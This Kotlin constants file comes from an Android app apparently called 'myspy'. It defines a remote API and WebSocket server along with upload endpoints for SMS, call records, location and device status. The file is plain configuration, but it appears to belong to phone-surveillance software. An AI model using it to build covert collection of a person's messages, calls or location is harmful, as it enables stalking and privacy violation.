package com.myspy.android.core.constants

/**
 * API Constants
 * @author Michael KOJDL
 * @version 1.0.0
 */
object ApiConstants {
    const val API_BASE_URL = "https://api.myspy.fir.ma/api/v1/"
    const val WSS_BASE_URL = "wss://wss.myspy.fir.ma/"

    // Timeouts (v sekundách)
    const val TIMEOUT_CONNECT = 30L
    const val TIMEOUT_READ = 30L
    const val TIMEOUT_WRITE = 30L

    // Retry policy
    const val MAX_RETRIES = 3
    const val RETRY_DELAY_MS = 2000L

    // API Endpoints
    const val ENDPOINT_REGISTER = "register/"
    const val ENDPOINT_SMS = "sms/"
    const val ENDPOINT_CALLS = "calls/"
    const val ENDPOINT_LOCATION = "location/"
    const val ENDPOINT_STATUS = "status/"

    // Headers
    const val HEADER_UUID = "X-Device-UUID"
    const val HEADER_API_KEY = "X-API-Key"
    const val HEADER_CONTENT_TYPE = "Content-Type"
    const val CONTENT_TYPE_JSON = "application/json"
}
